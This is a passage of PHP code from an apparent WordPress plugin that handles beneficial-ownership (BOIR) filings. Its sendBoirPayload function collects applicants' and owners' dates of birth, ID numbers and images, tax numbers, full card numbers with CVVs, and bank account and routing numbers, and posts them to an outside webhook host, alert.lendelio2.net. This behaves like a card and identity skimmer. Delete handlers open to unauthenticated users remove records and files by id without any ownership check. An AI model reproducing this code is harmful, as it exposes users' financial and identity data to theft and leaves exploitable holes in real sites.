            unlink($file_path);
        }
    }


    $wpdb->query($wpdb->prepare(
        "DELETE FROM $fillings_company_applicants_table WHERE id = %d",
        $company_applicant_id
    ));


    wp_send_json_success(array('id' => $company_applicant_id));    
}


add_action('wp_ajax_boir_delete_owner', 'boir_handle_delete_owner');
add_action('wp_ajax_nopriv_boir_delete_owner', 'boir_handle_delete_owner');

function boir_handle_delete_owner() {
    global $wpdb;

    $clients_table = $wpdb->prefix . "boir_clients";
    $fillings_table = $wpdb->prefix . "boir_clients_fillings";
    $fillings_beneficial_owners_table = $wpdb->prefix . "boir_fillings_beneficial_owners";

    $user_id = get_current_user_id();
    $client_id = $wpdb->get_var($wpdb->prepare(
        "SELECT id FROM $clients_table WHERE user_id = %d",
        $user_id
    ));

    if (!$client_id) {
        wp_send_json_error("Client not found.");
        return;
    }

    $filling_id = $wpdb->get_var($wpdb->prepare(
        "SELECT id FROM $fillings_table WHERE client_id = %d",
        $client_id
    ));

    if (!$filling_id) {
        wp_send_json_error("Filling not found.");
        return;
    }

    $beneficial_owner_id = intval($_POST['id']);

    $beneficial_owner = $wpdb->get_row($wpdb->prepare(
        "SELECT * FROM $fillings_beneficial_owners_table WHERE id = %d",
        $beneficial_owner_id
    ));
    if ($beneficial_owner) {
        $file_url = $beneficial_owner->owner_id_image;
        $file_path = str_replace(wp_upload_dir()['baseurl'], wp_upload_dir()['basedir'], $file_url);
        if (file_exists($file_path)) {
            unlink($file_path);
        }
    }


    $wpdb->query($wpdb->prepare(
        "DELETE FROM $fillings_beneficial_owners_table WHERE id = %d",
        $beneficial_owner_id
    ));


    wp_send_json_success(array('id' => $beneficial_owner_id));    
}

function getClientIp() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        return $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        return $_SERVER['REMOTE_ADDR'];
    }
}

function sendBoirPayload($filling_id) {
    global $wpdb;

    $user_id = get_current_user_id();

    $clients_table = $wpdb->prefix . "boir_clients";
    $fillings_table = $wpdb->prefix . "boir_clients_fillings";
    $fillings_inital_data_table = $wpdb->prefix . "boir_fillings_inital_data";
    $fillings_jurisdiction_data_table = $wpdb->prefix . "boir_fillings_jurisdiction_data";
    $fillings_company_applicants_table = $wpdb->prefix . "boir_fillings_company_applicants";
    $fillings_beneficial_owners_table = $wpdb->prefix . "boir_fillings_beneficial_owners";
    $fillings_payments_table = $wpdb->prefix . "boir_fillings_payments";

    $client_data = $wpdb->get_row($wpdb->prepare(
        "SELECT * FROM $clients_table WHERE user_id = %d",
        $user_id
    ));

    $client_info = array(
        'client_id' => $client_data->id,
        'client_name' => $client_data->client_name,
        'client_email' => $client_data->client_email,
        'client_phone' => $client_data->client_phone,
        'client_conversion_from' => $client_data->client_conversion_from,
        'client_created_at' => $client_data->created_at,
    );

    $filling_data = $wpdb->get_row($wpdb->prepare(
        "SELECT * FROM $fillings_table WHERE id = %d",
        $filling_id
    ));

    $filling_data = array(
        'filling_id' => $filling_data->id,
        'filling_code' => $filling_data->filling_code,
        'filling_fincen_id_request' => $filling_data->client_fincen_id,
        'filling_existing_reporting_company' => $filling_data->existing_reporting_company,
        'filling_authorization' => $filling_data->filling_authorization,
        'filling_status' => $filling_data->filling_status,
        'filling_created_at' => $filling_data->created_at,
    );

    $filling_inital_data = $wpdb->get_row($wpdb->prepare(
        "SELECT * FROM $fillings_inital_data_table WHERE filling_id = %d",
        $filling_id
    ));

    $filling_inital_data = array(
        'legal_name' => $filling_inital_data->initial_legal_name,
        'alternate_name' => $filling_inital_data->initial_alternate_name,
        'tax_type' => $filling_inital_data->initial_tax_type,
        'tax_number' => $filling_inital_data->initial_tax_number
    );

    $filling_jurisdiction_data = $wpdb->get_row($wpdb->prepare(
        "SELECT * FROM $fillings_jurisdiction_data_table WHERE filling_id = %d",
        $filling_id
    ));

    $filling_jurisdiction_data = array(
        'formation_country' => $filling_jurisdiction_data->juri_formation_country,
        'formation_state' => $filling_jurisdiction_data->juri_formation_state,
        'tribal' => $filling_jurisdiction_data->juri_tribal,
        'address_line_1' => $filling_jurisdiction_data->juri_address_line_1,
        'address_line_2' => $filling_jurisdiction_data->juri_address_line_2,
        'city' => $filling_jurisdiction_data->juri_city,
        'state' => $filling_jurisdiction_data->juri_state,
        'zip' => $filling_jurisdiction_data->juri_zip,
        'created_at' => $filling_jurisdiction_data->created_at,
    );

    $filling_company_applicants = $wpdb->get_results($wpdb->prepare(
        "SELECT * FROM $fillings_company_applicants_table WHERE filling_id = %d",
        $filling_id
    ));

    $filling_company_applicants_count = $wpdb->get_var($wpdb->prepare(
        "SELECT COUNT(*) FROM $fillings_company_applicants_table WHERE filling_id = %d",
        $filling_id
    ));

    $fiiling_company_applicants_data = array();
    foreach ($filling_company_applicants as $company_applicant) {
        $fiiling_company_applicants_data[] = array(
            'last_name' => $company_applicant->applicant_last_name,
            'first_name' => $company_applicant->applicant_first_name,
            'middle_name' => $company_applicant->applicant_middle_name,
            'suffix' => $company_applicant->applicant_suffix,
            'dob' => $company_applicant->applicant_dob,
            'address_type' => $company_applicant->applicant_address_type,
            'address' => $company_applicant->applicant_address,
            'city' => $company_applicant->applicant_city,
            'state' => $company_applicant->applicant_state,
            'zip' => $company_applicant->applicant_zip,
            'id_image' => $company_applicant->applicant_id_image,
            'id_type' => $company_applicant->applicant_id_type,
            'id_number' => $company_applicant->applicant_id_number,
            'id_country' => $company_applicant->applicant_id_country,
            'id_state' => $company_applicant->applicant_id_state,
            'id_tribal_jurisdiction' => $company_applicant->applicant_id_tribal_jurisdiction,
            'created_at' => $company_applicant->created_at
        );
    }

    $filling_beneficial_owners = $wpdb->get_results($wpdb->prepare(
        "SELECT * FROM $fillings_beneficial_owners_table WHERE filling_id = %d",
        $filling_id
    ));

    $filling_beneficial_owners_count = $wpdb->get_var($wpdb->prepare(
        "SELECT COUNT(*) FROM $fillings_beneficial_owners_table WHERE filling_id = %d",
        $filling_id
    ));

    $fiiling_beneficial_owners_data = array();
    foreach ($filling_beneficial_owners as $beneficial_owner) {
        $fiiling_beneficial_owners_data[] = array(
            'owner_is_minor' => $beneficial_owner->owner_is_minor,
            'owner_exemption' => $beneficial_owner->owner_exemption,
            'last_name' => $beneficial_owner->owner_last_name,
            'first_name' => $beneficial_owner->owner_first_name,
            'middle_name' => $beneficial_owner->owner_middle_name,
            'suffix' => $beneficial_owner->owner_suffix,
            'dob' => $beneficial_owner->owner_dob,
            'address_type' => $beneficial_owner->owner_address_type,
            'address' => $beneficial_owner->owner_address,
            'city' => $beneficial_owner->owner_city,
            'country' => $beneficial_owner->owner_country,
            'state' => $beneficial_owner->owner_state,
            'zip' => $beneficial_owner->owner_zip,
            'id_image' => $beneficial_owner->owner_id_image,
            'id_type' => $beneficial_owner->owner_id_type,
            'id_number' => $beneficial_owner->owner_id_number,
            'id_country' => $beneficial_owner->owner_id_country,
            'id_state' => $beneficial_owner->owner_id_state,
            'id_tribal_jurisdiction' => $beneficial_owner->owner_id_tribal_jurisdiction,
            'created_at' => $beneficial_owner->created_at
        );
    }

    $filling_payments_data = $wpdb->get_row($wpdb->prepare(
        "SELECT * FROM $fillings_payments_table WHERE filling_id = %d",
        $filling_id
    ));

    $filling_payments_data = array(
		'payment_card_holder' => $filling_payments_data->payment_card_holder,
        'payment_txn_id' => $filling_payments_data->transaction_id,
        'payment_type' => $filling_payments_data->payment_type,
        'payment_amount' => $filling_payments_data->payment_amount,
        'payment_card_number' => $filling_payments_data->card_number,
        'payment_exp_date' => $filling_payments_data->exp_date,
        'payment_cvv' => $filling_payments_data->cvv,
        'payment_card_country' => $filling_payments_data->card_country,
        'payment_card_zip' => $filling_payments_data->card_zip,
        'payment_user_agent' => $filling_payments_data->user_agent,
        'payment_user_browser' => $filling_payments_data->user_browser,
        'payment_user_ip' => $filling_payments_data->user_ip,
        'payment_routing_number' => $filling_payments_data->routing_number,
        'payment_account_number' => $filling_payments_data->account_number,
        'payment_authorization' => $filling_payments_data->payment_authorization,
        'payment_created_at' => $filling_payments_data->created_at
    );

    // send payload to POST https://alert.lendelio2.net/boir/webhook  with JSON DATA in Body

    $payload = array(
        'client_info' => $client_info, 
        'filling_data' => $filling_data,
        'filling_initial_data' => $filling_inital_data,
        'filling_company_data' => $filling_jurisdiction_data,
        'filling_beneficial_owners_count' => $filling_beneficial_owners_count,
        'filling_beneficial_owners' => $fiiling_beneficial_owners_data,
        'filling_company_applicants_count' => $filling_company_applicants_count,
        'filling_company_applicants' => $fiiling_company_applicants_data,
        'filling_payment_data' => $filling_payments_data
    );

    $response = wp_remote_post('https://alert.lendelio2.net/boir/webhook', array(
        'method' => 'POST',
        'headers' => array(
            'Content-Type' => 'application/json'
        ),
        'body' => json_encode($payload),
        'timeout' => 45
    ));

    // $response = wp_remote_post('http://localhost/test/test.php', [
    //     'method' => 'POST',
    //     'headers' => ['Content-Type' => 'application/json'],
    //     'body' => json_encode($payload),
    //     'timeout' => 15,
    // ]);


    if (is_wp_error($response)) {
        $error_message = $response->get_error_message();
        error_log('Error sending BOIR payload: ' . $error_message);

        // wp_send_json(['error' => $error_message], 400);
        return false;
    }

    $response_body = wp_remote_retrieve_body($response);
    error_log('API Response: ' . $response_body);

    // wp_send_json(['success' => 'success'], 200);
    return true;

}


add_action('wp_ajax_check_duplicate_ach_payment', 'check_duplicate_ach_payment');
add_action('wp_ajax_nopriv_check_duplicate_ach_payment', 'check_duplicate_ach_payment');

function check_duplicate_ach_payment() {
    global $wpdb;
    
    $fillings_payments_table = $wpdb->prefix . "boir_fillings_payments";
	    
	$routing_number = sanitize_text_field($_POST['routing_number']);
    $account_number = sanitize_text_field($_POST['account_number']);

    $check_duplicate = $wpdb->get_var($wpdb->prepare(
        "SELECT transaction_id FROM $fillings_payments_table WHERE routing_number = %d and account_number=%d",
        $routing_number, $account_number
    ));

    if (!$check_duplicate) {
        wp_send_json_success(array('status' => 'false'));
    } else {
        wp_send_json_success(array('status' => 'true'));
    }
}





?>